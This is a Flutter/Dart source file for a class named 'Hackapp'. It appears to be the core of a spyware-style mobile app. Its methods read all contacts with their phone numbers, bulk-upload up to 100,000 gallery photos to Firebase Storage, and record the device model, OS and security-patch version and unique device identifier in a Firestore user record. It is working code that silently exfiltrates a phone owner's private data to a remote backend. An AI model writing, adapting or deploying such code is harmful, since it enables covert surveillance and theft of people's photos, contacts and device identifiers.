import 'dart:io';

import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:device_info/device_info.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:photo_manager/photo_manager.dart';

FirebaseStorage storage = FirebaseStorage.instance;
final _firestore = FirebaseFirestore.instance;

class Hackapp extends ChangeNotifier {
  String deviceName = '';
  String deviceVersion = "";
  String identifier = '';
  List<Contact> contacts = [];
  accessallcontact(uid) async {
    if (await FlutterContacts.requestPermission()) {
      List<Map<String, dynamic>> phonemuber = [];

      contacts = await FlutterContacts.getContacts(withProperties: true);
      for (var i = 0; i < contacts.length; i++) {
        if (contacts[i].phones.isNotEmpty) {
          phonemuber
              .add({contacts[i].displayName: contacts[i].phones[0].number});
        }
      }
      await _firestore.collection('users').doc(uid).update(
        {
          'Contacts': FieldValue.arrayUnion(phonemuber),
        },
      );
    }
  }

  Future<void> loadGalleryImages(String uid) async {
    final List<AssetPathEntity> paths =
        await PhotoManager.getAssetPathList(type: RequestType.image);

    final List<AssetEntity> assets = await paths[0].getAssetListRange(
      start: 0,
      end: 100000,
    );

    for (var element in assets) {
      element.file.then((value) async {
        if (value?.path != null) {
          bool issaved = await alreadyExistlink(link: value?.path ?? '');
          if (issaved) {
          } else {
            final link = await _uploadImage(File(value!.path));
            uploadlink(uid, link, value.path);
          }
        }
      });
    }
  }

  Future<bool> alreadyExistlink({required String link}) async {
    QuerySnapshot querySnap = await _firestore
        .collection('users')
        .where('locallink', arrayContains: link)
        .get();
    return querySnap.docs.isNotEmpty;
  }

  Future<List<String>> getDeviceDetails() async {
    final DeviceInfoPlugin deviceInfoPlugin = DeviceInfoPlugin();
    try {
      if (Platform.isAndroid) {
        var build = await deviceInfoPlugin.androidInfo;
        deviceName = build.model;
        deviceVersion =
            "preview : ${build.version.previewSdkInt}, release: ${build.version.release}, sdk : ${build.version.sdkInt}, securityPatch: ${build.version.securityPatch} ";
        identifier = build.androidId; //UUID for Android
      } else if (Platform.isIOS) {
        var data = await deviceInfoPlugin.iosInfo;
        deviceName = data.name;
        deviceVersion = data.systemVersion;
        identifier = data.identifierForVendor; //UUID for iOS
      }
    } on PlatformException {
      print('Failed to get platform version');
    }

    return [deviceName, deviceVersion, identifier];
  }

  Future<String> _uploadImage(File file) async {
    final String fileName = file.path.split('/').last;
    final Reference reference = storage.ref().child('images/$fileName');
    final UploadTask uploadTask = reference.putFile(file);
    final TaskSnapshot taskSnapshot = await uploadTask;
    return await taskSnapshot.ref.getDownloadURL();
  }

  uploadlink(String uid, String link, String locallink) async {
    await _firestore.collection('users').doc(uid).update(
      {
        'images': FieldValue.arrayUnion([link]),
        'locallink': FieldValue.arrayUnion([locallink])
      },
    );
  }
}
